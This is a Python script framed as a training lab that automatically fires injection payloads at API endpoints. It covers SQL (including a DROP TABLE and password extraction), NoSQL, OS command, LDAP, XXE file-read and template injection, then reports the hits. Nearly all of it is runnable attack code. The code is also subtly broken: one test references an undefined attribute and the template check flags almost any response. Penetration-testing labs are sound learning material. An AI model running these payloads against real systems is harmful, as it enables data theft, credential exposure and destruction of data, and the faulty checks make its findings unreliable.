#!/usr/bin/env python3
"""
Critical Lab: API Injection Attacks (SQL, NoSQL, Command, LDAP)
Real-world scenario: Testing API endpoints for injection vulnerabilities

This lab covers:
- SQL Injection via API parameters
- NoSQL injection (MongoDB, CouchDB)
- Command injection through API inputs
- LDAP injection attacks
- Template injection
- Expression Language (EL) injection
- XML injection
"""

import requests
import json
import subprocess
from typing import Dict, List, Tuple
import re

class APIInjectionLab:
    """
    Advanced injection attack testing lab for APIs
    """
    
    def __init__(self, target_url: str, api_key: str = ""):
        self.target_url = target_url
        self.api_key = api_key
        self.session = requests.Session()
        self.vulnerabilities = []
        self.payloads_tested = 0
    
    def test_sql_injection_basic(self, endpoint: str, param: str) -> Dict:
        """
        Test 1: Basic SQL injection via API parameters
        Vulnerability: Unsanitized database queries
        """
        print(f"[*] Testing SQL injection on {endpoint}?{param}=...")
        
        sql_payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL--",
            "1; DROP TABLE users--",
            "' OR 1=1--",
            "admin'--",
            "' OR 'a'='a",
            "1' UNION SELECT username, password FROM users--",
        ]
        
        for payload in sql_payloads:
            try:
                response = self.session.get(
                    f"{self.endpoint}/{endpoint}",
                    params={param: payload},
                    timeout=5
                )
                
                # Check for SQL error messages
                if any(error in response.text.lower() for error in ['sql', 'syntax error', 'database error', 'mysql']):
                    self.vulnerabilities.append(f"SQL Injection - Error-based: {payload}")
                    return {"vulnerable": True, "severity": "CRITICAL", "payload": payload}
                
                # Check for successful data extraction indicators
                if len(response.text) > 1000 and response.status_code == 200:
                    self.vulnerabilities.append(f"SQL Injection - Blind/Inferential: {payload}")
                    return {"vulnerable": True, "severity": "CRITICAL", "method": "blind"}
            except Exception as e:
                print(f"[!] Error: {e}")
        
        return {"vulnerable": False}
    
    def test_sql_injection_time_based(self, endpoint: str, param: str) -> Dict:
        """
        Test 2: Time-based blind SQL injection
        Vulnerability: Conditional database delays
        """
        print(f"[*] Testing time-based SQL injection on {endpoint}...")
        
        payloads = [
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SLEEP(5))--",
        ]
        
        for payload in payloads:
            try:
                import time
                start = time.time()
                response = self.session.get(
                    f"{self.target_url}/{endpoint}",
                    params={param: payload},
                    timeout=10
                )
                elapsed = time.time() - start
                
                if elapsed > 4:
                    self.vulnerabilities.append(f"Time-Based SQL Injection: {elapsed:.2f}s delay")
                    return {"vulnerable": True, "severity": "CRITICAL", "delay": elapsed}
            except requests.Timeout:
                self.vulnerabilities.append(f"Time-Based SQL Injection: Request timeout")
                return {"vulnerable": True, "severity": "CRITICAL"}
            except Exception as e:
                pass
        
        return {"vulnerable": False}
    
    def test_nosql_injection(self, endpoint: str, param: str) -> Dict:
        """
        Test 3: NoSQL injection (MongoDB)
        Vulnerability: Unsafe object instantiation
        """
        print(f"[*] Testing NoSQL injection on {endpoint}...")
        
        nosql_payloads = [
            {"$ne": None},
            {"$gt": ""},
            {"$where": "1==1"},
            {"$where": "this.password == '123'"},
            {"email": {"$regex": ".*"}},
            {"$or": [{}, {"a":"a"}]},
        ]
        
        for payload in nosql_payloads:
            try:
                response = self.session.post(
                    f"{self.target_url}/{endpoint}",
                    json={param: payload},
                    timeout=5
                )
                
                if response.status_code == 200 and len(response.text) > 100:
                    self.vulnerabilities.append(f"NoSQL Injection: {json.dumps(payload)}")
                    return {"vulnerable": True, "severity": "CRITICAL", "payload": payload}
            except Exception as e:
                pass
        
        return {"vulnerable": False}
    
    def test_command_injection(self, endpoint: str, param: str) -> Dict:
        """
        Test 4: OS command injection
        Vulnerability: Unsanitized command execution
        """
        print(f"[*] Testing command injection on {endpoint}...")
        
        command_payloads = [
            "; whoami",
            "| whoami",
            "& whoami",
            "`whoami`",
            "$(whoami)",
            "; id",
            "| cat /etc/passwd",
            "& powershell.exe -Command 'Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts'",
        ]
        
        for payload in command_payloads:
            try:
                response = self.session.get(
                    f"{self.target_url}/{endpoint}",
                    params={param: payload},
                    timeout=5
                )
                
                # Check for command output indicators
                if any(indicator in response.text for indicator in ['uid=', 'root', 'nobody', 'Administrator', 'C:\\\\Windows']):
                    self.vulnerabilities.append(f"Command Injection: {payload}")
                    return {"vulnerable": True, "severity": "CRITICAL", "payload": payload}
            except Exception as e:
                pass
        
        return {"vulnerable": False}
    
    def test_ldap_injection(self, endpoint: str, param: str) -> Dict:
        """
        Test 5: LDAP injection attacks
        Vulnerability: Unsanitized LDAP queries
        """
        print(f"[*] Testing LDAP injection on {endpoint}...")
        
        ldap_payloads = [
            "*",
            "admin*",
            "*)(uid=*",
            "admin)(|(uid=*",
            "*)(|(uid=*",
        ]
        
        for payload in ldap_payloads:
            try:
                response = self.session.get(
                    f"{self.target_url}/{endpoint}",
                    params={param: payload},
                    timeout=5
                )
                
                if response.status_code == 200 and len(response.text) > 500:
                    self.vulnerabilities.append(f"LDAP Injection: {payload}")
                    return {"vulnerable": True, "severity": "CRITICAL", "payload": payload}
            except Exception as e:
                pass
        
        return {"vulnerable": False}
    
    def test_xml_injection(self, endpoint: str) -> Dict:
        """
        Test 6: XML injection including XXE
        Vulnerability: Unsafe XML parsing
        """
        print(f"[*] Testing XML/XXE injection on {endpoint}...")
        
        xxe_payloads = [
            '''<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>''',
            '''<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>''',
        ]
        
        for payload in xxe_payloads:
            try:
                response = self.session.post(
                    f"{self.target_url}/{endpoint}",
                    data=payload,
                    headers={"Content-Type": "application/xml"},
                    timeout=5
                )
                
                if any(indicator in response.text for indicator in ['root:', 'System32', 'drivers']):
                    self.vulnerabilities.append(f"XXE Injection: File disclosure")
                    return {"vulnerable": True, "severity": "CRITICAL", "method": "XXE"}
            except Exception as e:
                pass
        
        return {"vulnerable": False}
    
    def test_template_injection(self, endpoint: str, param: str) -> Dict:
        """
        Test 7: Server-side template injection
        Vulnerability: Template engine code execution
        """
        print(f"[*] Testing template injection on {endpoint}...")
        
        template_payloads = [
            "{{7*7}}",  # Jinja2
            "${7*7}",   # FreeMarker
            "<%= 7*7 %>",  # ERB
            "#{7*7}",   # Thymeleaf
            "@{7*7}",   # Razor
        ]
        
        for payload in template_payloads:
            try:
                response = self.session.get(
                    f"{self.target_url}/{endpoint}",
                    params={param: payload},
                    timeout=5
                )
                
                # Check if template was evaluated
                if "49" in response.text or "7*7" not in response.text:
                    self.vulnerabilities.append(f"Template Injection: {payload}")
                    return {"vulnerable": True, "severity": "CRITICAL", "payload": payload}
            except Exception as e:
                pass
        
        return {"vulnerable": False}
    
    def run_all_tests(self, endpoints: List[Dict]) -> None:
        """
        Execute all injection tests
        endpoints: List of {"endpoint": "/api/user", "param": "id"}
        """
        print("\n[+] Starting Critical API Injection Attack Lab")
        print(f"[+] Target: {self.target_url}")
        print("\n" + "="*60 + "\n")
        
        for endpoint_info in endpoints:
            endpoint = endpoint_info.get("endpoint", "/api/user")
            param = endpoint_info.get("param", "id")
            
            self.test_sql_injection_basic(endpoint, param)
            self.test_sql_injection_time_based(endpoint, param)
            self.test_nosql_injection(endpoint, param)
            self.test_command_injection(endpoint, param)
            self.test_ldap_injection(endpoint, param)
            self.test_xml_injection(endpoint)
            self.test_template_injection(endpoint, param)
        
        print("\n" + "="*60)
        print("[+] Injection Testing Complete")
        print(f"[+] Vulnerabilities Found: {len(self.vulnerabilities)}")
        print("\n" + "="*60 + "\n")
        
        for idx, vuln in enumerate(self.vulnerabilities, 1):
            print(f"[{idx}] {vuln}")


if __name__ == "__main__":
    target = "http://api.vulnerable-app.local:8080"
    
    endpoints = [
        {"endpoint": "/api/users", "param": "id"},
        {"endpoint": "/api/search", "param": "q"},
        {"endpoint": "/api/login", "param": "username"},
    ]
    
    lab = APIInjectionLab(target)
    lab.run_all_tests(endpoints)
